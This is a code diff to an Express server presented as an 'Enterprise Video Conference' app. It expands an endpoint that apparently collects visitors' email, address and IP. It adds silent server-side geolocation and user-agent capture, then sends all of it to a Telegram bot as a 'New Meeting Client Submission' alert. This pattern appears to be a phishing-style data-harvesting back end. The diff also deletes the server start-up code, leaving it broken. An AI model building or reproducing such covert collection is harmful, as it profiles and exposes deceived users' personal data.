@@ -79,6 +79,7 @@ app.get('/api/client-ip', async (req, res) => {
 // ==========================================
 // NEW: Telegram Notification Endpoint
 // ==========================================
+// Endpoint to handle client info submission, IP geolocation, and Telegram notification
 app.post('/api/submit-client-info', async (req, res) => {
   try {
     const { clientEmail, clientAddress, meetingId, hostName, clientIp } = req.body;
@@ -91,15 +92,51 @@ app.post('/api/submit-client-info', async (req, res) => {
       return res.status(500).json({ success: false, error: 'Server configuration error' });
     }
 
+    // 1. Resolve final IP using your helper or fallback
+    const resolvedIp = clientIp && clientIp !== 'Detecting...' && clientIp !== 'Unavailable' 
+      ? clientIp 
+      : await getPublicIp(req);
+
+    // 2. Fetch IP-based location automatically on the server (Zero user friction)
+    let country = 'Unknown';
+    let region = 'Unknown';
+    let city = 'Unknown';
+
+    if (resolvedIp && !isPrivateIp(resolvedIp) && resolvedIp !== 'Unavailable') {
+      try {
+        const geoRes = await fetch(`http://ip-api.com/json/${resolvedIp}`);
+        if (geoRes.ok) {
+          const geoData = await geoRes.json() as any;
+          if (geoData.status === 'success') {
+            country = geoData.country || 'Unknown';
+            region = geoData.regionName || 'Unknown';
+            city = geoData.city || 'Unknown';
+          }
+        }
+      } catch (geoErr) {
+        console.error('GeoIP lookup error:', geoErr);
+      }
+    }
+
+    // 3. Capture User Agent from request headers
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+
+    // 4. Format the message into your exact requested layout
     const message = `
 🚨 *New Meeting Client Submission* 🚨
 
-👤 *Client Details:*
+--- IP & REGIONAL LOCATION ---
+• *IP Address:* ${resolvedIp || 'N/A'}
+• *Country:* ${country}
+• *State / Region:* ${region}
+• *City:* ${city}
+
+--- SYSTEM INFO ---
+• *User Agent:* ${userAgent}
+
+--- CLIENT DETAILS ---
 • *Email:* ${clientEmail || 'N/A'}
 • *Address:* ${clientAddress || 'N/A'}
-• *IP Address:* ${clientIp || 'N/A'}
-
-📅 *Meeting Context:*
 • *Room ID:* ${meetingId || 'N/A'}
 • *Host:* ${hostName || 'Host'}
 • *Time:* ${new Date().toLocaleString()}
@@ -127,26 +164,3 @@ app.post('/api/submit-client-info', async (req, res) => {
     return res.status(500).json({ success: false, error: 'Failed to send notification' });
   }
 });
-
-// Vite middleware configuration
-async function start() {
-  if (process.env.NODE_ENV !== "production") {
-    const vite = await createViteServer({
-      server: { middlewareMode: true },
-      appType: "spa",
-    });
-    app.use(vite.middlewares);
-  } else {
-    const distPath = path.join(process.cwd(), 'dist');
-    app.use(express.static(distPath));
-    app.get('*', (_req, res) => {
-      res.sendFile(path.join(distPath, 'index.html'));
-    });
-  }
-
-  app.listen(PORT, "0.0.0.0", () => {
-    console.log(`Enterprise Video Conference server running on http://localhost:${PORT}`);
-  });
-}
-
-start();
